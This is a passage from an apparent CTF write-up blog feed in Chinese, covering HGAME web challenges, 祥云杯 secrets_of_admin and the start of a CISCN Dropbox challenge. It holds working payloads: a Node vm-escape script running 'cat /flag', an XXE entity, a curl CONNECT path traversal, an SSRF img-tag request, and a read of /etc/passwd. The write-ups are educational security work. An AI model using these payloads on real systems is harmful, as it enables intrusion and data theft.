class="number">11</span>), <span class="string">&#x27;javascript:&#x27;</span>);</span><br><span class="line">        browser.emit(<span class="string">&#x27;loaded&#x27;</span>, <span class="built_in">document</span>);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        browser.emit(<span class="string">&#x27;error&#x27;</span>, error);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">document</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> javascript 伪协议的代码内容会被传递给 <code>window._evaluate</code>，跟进</p><p><img src="/2022/02/12/hgame-wp/image-20220221143053017.png" alt="image-20220221143053017"></p><p>_evaluate()使用nodejs 的 <code>vm</code> 模块运行 js 代码，代码运行的上下文就是 <code>window</code> 对象，按照 nodejs 官方的说法，vm 并不是一种安全的机制，不应该用它来运行不安全的代码，攻击者构造包含恶意 javascript 代码的页面，使用 Zoombie 访问后就有可能产生 vm 逃逸实现 RCE</p><p>这里贴个payload：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> h=<span class="string">&#x27;child_p&#x27;</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> e=<span class="string">&#x27;rocess&#x27;</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> i=[h,e].join(<span class="string">&#x27;&#x27;</span>);</span></span><br><span class="line"><span class="javascript">x=clearImmediate[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`constructo`</span>&#125;</span>r`</span>&#125;</span>`</span>]([<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`return proces`</span>&#125;</span>s`</span>&#125;</span>`</span>])();</span></span><br><span class="line"><span class="javascript">y=x.mainModule.require(i);</span></span><br><span class="line"><span class="javascript">z=y.execSync(<span class="string">&#x27;cat /flag&#x27;</span>).toString();</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.write(z);</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/12/hgame-wp/image-20220221162052869.png" alt="image-20220221162052869"></p><h1 id="Comment"><a href="#Comment" class="headerlink" title="Comment"></a>Comment</h1><p><code>www.zip</code>源码泄露，审计源码</p><p>waf函数过滤了很多php的协议，但还有data协议未过滤</p><p>有个关键函数parseXML()，其中有一段代码为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parseXML</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">   ......</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$attrs</span>-&gt;sender == <span class="string">&#x27;admin&#x27;</span> &amp;&amp; !preg_match(<span class="string">&#x27;/admin/i&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$flag</span> = <span class="string">&#x27;hgame&#123;xxxxx&#125;&#x27;</span>;</span><br><span class="line">        <span class="variable">$attrs</span>-&gt;content = <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$attrs</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>若sender标签的值为admin且正则匹配没有匹配到admin的话就会直接返回flag，结合上面没有被过滤的data协议，可以构造一个base64编码的admin来xxe，payload如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY b <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;data://text/plain;base64,YWRtaW4=&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">comment</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sender</span>&gt;</span><span class="symbol">&amp;b;</span><span class="tag">&lt;/<span class="name">sender</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">content</span>&gt;</span>hgame<span class="tag">&lt;/<span class="name">content</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br></pre></td></tr></table></figure><p>抓包，POST传参内容替换为payload，放包，即可得到flag</p><p><img src="/2022/02/12/hgame-wp/image-20220216135740468-16451642991921.png" alt="image-20220216135740468"></p><h1 id="FileSystem"><a href="#FileSystem" class="headerlink" title="FileSystem"></a>FileSystem</h1><p>main.go源码如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">fileHandler</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">http.FileServer(http.Dir(<span class="string">&quot;./&quot;</span>)).ServeHTTP(w, r)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">http.HandleFunc(<span class="string">&quot;/&quot;</span>, fileHandler)</span><br><span class="line">http.HandleFunc(<span class="string">&quot;/there_may_be_a_flag&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">w.Write([]<span class="keyword">byte</span>(<span class="string">`No! You can&#x27;t see the flag!`</span>))</span><br><span class="line">&#125;)</span><br><span class="line">log.Fatal(http.ListenAndServe(<span class="string">&quot;:8889&quot;</span>, <span class="literal">nil</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>fileHandler()有问题，存在漏洞可以跨路径读取flag，思路与<a href="https://brycec.me/posts/justctf2020_writeups#go-fs">justCTF2020的Go-fs</a>类似</p><p><strong>1.curl –path-as-is会使curl完全按照URL中提供的方式发送路径，而不会删除任何点段</strong></p><p><strong>2.对于CONNECT请求，url中的特殊字符不会被处理</strong></p><p>payload为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X CONNECT --path-as-is http://3445d0f8a3.filesystem.hgame.homeboyc.cn/123/../there_may_be_a_flag</span><br></pre></td></tr></table></figure><p><img src="/2022/02/12/hgame-wp/image-20220218160144932.png" alt="image-20220218160144932"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;蛛蛛&quot;&gt;&lt;a href=&quot;#蛛蛛&quot; class=&quot;headerlink&quot; title=&quot;蛛蛛&quot;&gt;&lt;/a&gt;蛛蛛&lt;/h1&gt;&lt;p&gt;简单爬虫，脚本如下&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;g</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>祥云杯2021-secrets_of_admin</title>
    <link href="https://wuyusanhua2021.github.io/2022/02/09/secrets-of-admin/"/>
    <id>https://wuyusanhua2021.github.io/2022/02/09/secrets-of-admin/</id>
    <published>2022-02-09T05:55:26.000Z</published>
    <updated>2022-02-09T11:03:21.763Z</updated>
    
    <content type="html"><![CDATA[<p>登录界面提示以admin身份登录</p><p><img src="/2022/02/09/secrets-of-admin/image-20220209143402636.png" alt="image-20220209143402636"></p><p>下载附件</p><p><img src="/2022/02/09/secrets-of-admin/image-20220209135724262.png" alt="image-20220209135724262"></p><p>routes文件夹里则是index.ts，有各个路由的具体实现代码</p><p>database.ts里面是一个SQLite3对象和一个DB类，其中显示superuser用户有一个flag文件，应该就是要找的flag</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> files (username, filename, checksum) <span class="keyword">VALUES</span> (<span class="string">&#x27;superuser&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;be5a14a8e504a66979f6938338b0662c&#x27;</span>);`);</span><br></pre></td></tr></table></figure><p>但是index.ts里直接把superuser给ban了，再找到admin的密码，登录来到<code>/admin</code>路由</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> users (id, username, password) <span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;e365655e013ce7fdbdbf8f27b418c8fe6dc9354dc4c0328fa02b0ea547659645&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="/2022/02/09/secrets-of-admin/image-20220209143335124.png" alt="image-20220209143335124"></p><p>随便输点东西generate一下</p><p><img src="/2022/02/09/secrets-of-admin/image-20220209144234755.png" alt="image-20220209144234755"></p><p>提示<code>how to download it right?</code></p><p>审计index.ts中<code>/admin</code>路由相关的代码</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/admin&#x27;</span>, checkAuth, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; content &#125; = req.body;</span><br><span class="line">    <span class="keyword">if</span> ( content == <span class="string">&#x27;&#x27;</span> || content.includes(<span class="string">&#x27;&lt;&#x27;</span>) || content.includes(<span class="string">&#x27;&gt;&#x27;</span>) || content.includes(<span class="string">&#x27;/&#x27;</span>) || content.includes(<span class="string">&#x27;script&#x27;</span>) || content.includes(<span class="string">&#x27;on&#x27;</span>))&#123;</span><br><span class="line">        <span class="comment">// even admin can&#x27;t be trusted right ? :)  </span></span><br><span class="line">        <span class="keyword">return</span> res.render(<span class="string">&#x27;admin&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Forbidden word 🤬&#x27;</span>&#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> template = <span class="string">`</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;meta charset=&quot;utf8&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;title&gt;Create your own pdfs&lt;/title&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;</span></span><br><span class="line"><span class="string">        &lt;h3&gt;<span class="subst">$&#123;content&#125;</span>&lt;/h3&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">        `</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> filename = <span class="string">`<span class="subst">$&#123;uuid()&#125;</span>.pdf`</span></span><br><span class="line">            pdf.create(template, &#123;</span><br><span class="line">                <span class="string">&quot;format&quot;</span>: <span class="string">&quot;Letter&quot;</span>,</span><br><span class="line">                <span class="string">&quot;orientation&quot;</span>: <span class="string">&quot;portrait&quot;</span>,</span><br><span class="line">                <span class="string">&quot;border&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;pdf&quot;</span>,</span><br><span class="line">                <span class="string">&quot;renderDelay&quot;</span>: <span class="number">3000</span>,</span><br><span class="line">                <span class="string">&quot;timeout&quot;</span>: <span class="number">5000</span></span><br><span class="line">            &#125;).toFile(<span class="string">`./files/<span class="subst">$&#123;filename&#125;</span>`</span>, <span class="keyword">async</span> (err, _) =&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) next(createError(<span class="number">500</span>));</span><br><span class="line">                <span class="keyword">const</span> checksum = <span class="keyword">await</span> getCheckSum(filename);</span><br><span class="line">                <span class="keyword">await</span> DB.Create(<span class="string">&#x27;superuser&#x27;</span>, filename, checksum)</span><br><span class="line">                <span class="keyword">return</span> res.render(<span class="string">&#x27;admin&#x27;</span>, &#123; <span class="attr">message</span> : <span class="string">`Your pdf is successfully saved 🤑 You know how to download it right?`</span>&#125;);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.render(<span class="string">&#x27;admin&#x27;</span>, &#123; <span class="attr">error</span> : <span class="string">&#x27;Failed to generate pdf 😥&#x27;</span>&#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>content被过滤了一些关键字符，如果通过过滤就会在<code>/files</code>下生成一个pdf文件，DB-&gt;create()函数中的insert语句和上面superuser生成flag文件的语句一致，可推测flag文件就是在<code>/files</code>路由下</p><p>现在就是要想办法查看这个flag文件，看看剩下的代码</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// You can also add file logs here!</span></span><br><span class="line">router.get(<span class="string">&#x27;/api/files&#x27;</span>, <span class="keyword">async</span> (req, res, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.socket.remoteAddress.replace(<span class="regexp">/^.*:/</span>, <span class="string">&#x27;&#x27;</span>) != <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> next(createError(<span class="number">401</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> &#123; username , filename, checksum &#125; = req.query;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span>(username) == <span class="string">&quot;string&quot;</span> &amp;&amp; <span class="keyword">typeof</span>(filename) == <span class="string">&quot;string&quot;</span> &amp;&amp; <span class="keyword">typeof</span>(checksum) == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">await</span> DB.Create(username, filename, checksum)</span><br><span class="line">            <span class="keyword">return</span> res.send(<span class="string">&#x27;Done&#x27;</span>)</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.send(<span class="string">&#x27;Error!&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> res.send(<span class="string">&#x27;Parameters error&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/api/files/:id&#x27;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> token = req.signedCookies[<span class="string">&#x27;token&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> (token &amp;&amp; token[<span class="string">&#x27;username&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (token.username == <span class="string">&#x27;superuser&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.send(<span class="string">&#x27;Superuser is disabled now&#x27;</span>);   </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> filename = <span class="keyword">await</span> DB.getFile(token.username, req.params.id)</span><br><span class="line">            <span class="keyword">if</span> (fs.existsSync(path.join(__dirname , <span class="string">&quot;../files/&quot;</span>, filename)))&#123;</span><br><span class="line">                <span class="keyword">return</span> res.send(<span class="keyword">await</span> readFile(path.join(__dirname , <span class="string">&quot;../files/&quot;</span>, filename)));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> res.send(<span class="string">&#x27;No such file!&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.send(<span class="string">&#x27;Error!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> res.redirect(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>/api/files</code>路由会ban掉非127.0.0.1的访问，通过过滤也能给username用户添加文件，接着是<code>api/files/:id</code>，通过DB-&gt;getFile()实现了一个查看<code>/files</code>路由下文件的功能，通过该函数读取文件，需要文件名以及对应的checksum(也就是路由中的id)</p><p>这道题的漏洞在于，flag文件是储存在<code>/files</code>路由下的，并且checksum不是所有用户共享的，而数据库中存储的是用户名，文件名和该用户账号中文件的checksum，虽然superuser无法使用，但是可以把属于superuser的flag文件名和自定义的checksum添加到admin账号里面，然后用admin账号来访问flag</p><p>content的过滤使用includes()函数，可用数组绕过，在app.ts中提到，监听的端口为8888，用<code>&lt;img src=&quot;&quot;&gt;</code>触发ssrf，payload为：</p><p><code>content[]=&lt;img src=&quot;http://127.0.0.1:8888/api/files/?username=admin&amp;filename=./flag&amp;checksum=123&quot;&gt;</code></p><p>最好url编码一次<code>content%5B%5D%3D%3Cimg%20src%3D%22http%3A//127.0.0.1%3A8888/api/files/%3Fusername%3Dadmin%26filename%3D./flag%26checksum%3D123%22%3E</code></p><p>post传递payload，再访问<code>/api/files/123</code>即可下载flag文件</p><p><img src="/2022/02/09/secrets-of-admin/image-20220209185442890.png" alt="image-20220209185442890"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;登录界面提示以admin身份登录&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2022/02/09/secrets-of-admin/image-20220209143402636.png&quot; alt=&quot;image-20220209143402636&quot;&gt;&lt;/p&gt;
&lt;p&gt;下载附件&lt;/p</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CISCN2019华北赛区Day1Web1-Dropbox</title>
    <link href="https://wuyusanhua2021.github.io/2022/01/23/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay1Web1-Dropbox/"/>
    <id>https://wuyusanhua2021.github.io/2022/01/23/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay1Web1-Dropbox/</id>
    <published>2022-01-23T09:10:54.000Z</published>
    <updated>2022-01-24T07:27:37.191Z</updated>
    
    <content type="html"><![CDATA[<p>注册账号，登录，进入一个网盘管理页面，允许进行<code>jpg/png/gif</code>文件的上传和下载，上传一句话木马然后抓包，绕过<code>Content-Type</code>验证，即可在列表中看到上传的文件</p><p><img src="/2022/01/23/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay1Web1-Dropbox/image-20220123213022231.png" alt="image-20220123213022231"></p><p>这里没有上传文件的路径，蚁剑是连接不了的，但关键在于它提供的文件下载功能，这里下载文件并抓包</p><p><img src="/2022/01/23/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay1Web1-Dropbox/image-20220123221215369.png" alt="image-20220123221215369"></p><p>可以看见要下载的文件名就是变量<code>filename</code>的值，并且将报文发送之后就可以得到文件内容，那么就可以推测能通过修改它的值，来得到我们需要的文件的具体内容，先验证一下，查看系统文件<code>/etc/passwd</code></p><p><img src="/2022/01/23/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay1Web1-Dropbox/image-20220123214632853.png" alt="image-20220123214632853"></p><p>成功得到passwd文件的内容，现在尝试直接查看flag文件</p><p><img src="/2022/01/23/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay1Web1-Dropbox/image-20220123215052845.png" alt="image-20220123215052845"></p><p>显示文件不存在，应该是无法通过这种方式直接得到flag了，这里先把其它可能有用的文件显示出来</p><p><strong>download.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line">ini_set(<span class="string">&quot;open_basedir&quot;</span>, getcwd() . <span class="string">&quot;:/etc:/tmp&quot;</span>);</span><br><span class="line"></span><br><span class="line">chdir(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> File();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;open(<span class="variable">$filename</span>) &amp;&amp; stristr(<span class="variable">$filename</span>, <span class="string">&quot;flag&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">    Header(<span class="string">&quot;Content-type: application/octet-stream&quot;</span>);</span><br><span class="line">    Header(<span class="string">&quot;Content-Disposition: attachment; filename=&quot;</span> . basename(<span class="variable">$filename</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$file</span>-&gt;close();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File not exist&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看见对任意文件名中含有<code>flag</code>的文件，想要查看都会回显<code>File not exist</code>，这里其实也是在提示flag所在的文件名</p><p><strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> FileList(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$a</span>-&gt;Name();</span><br><span class="line"><span class="variable">$a</span>-&gt;Size();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上面两个文件中均引用了<strong>class.php</strong>文件，推测这应该也是一个关键文件，以同样的方式查看</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span 